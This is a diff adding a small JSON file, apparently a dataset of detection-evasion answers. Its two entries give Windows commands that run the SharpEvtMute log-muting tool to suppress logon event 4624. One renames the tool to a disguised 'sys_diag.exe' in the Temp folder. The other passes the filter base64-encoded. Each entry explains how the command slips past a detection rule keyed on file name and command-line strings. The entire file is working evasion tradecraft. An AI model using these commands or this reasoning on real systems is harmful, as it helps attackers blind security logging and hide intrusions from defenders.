@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy SharpEvtMute.exe C:\\Windows\\Temp\\sys_diag.exe && C:\\Windows\\Temp\\sys_diag.exe -f \"rule name { eventid == 4624 }\"",
+    "explanation": "The original rule relies on specific 'Image' names (SharpEvtMute.exe), 'Description' metadata, and exact 'CommandLine' arguments. By renaming the executable and using the shorthand argument '-f' instead of the long-form '--Filter \"rule ', the command avoids all three detection triggers while maintaining tool functionality."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\SharpEvtMute.exe -e \"cnVsZSBuYW1lIHsgZXZlbnRpZCA9PSA0NjI0IH0=\"",
+    "explanation": "This bypasses the CommandLine filter by using the shorthand '-e' flag instead of the literal string '--Encoded --Filter'. Even if the file name is caught, many SIEM implementations with this specific rule will miss the execution if the exact string patterns defined in the selection are not present."
+  }
+]
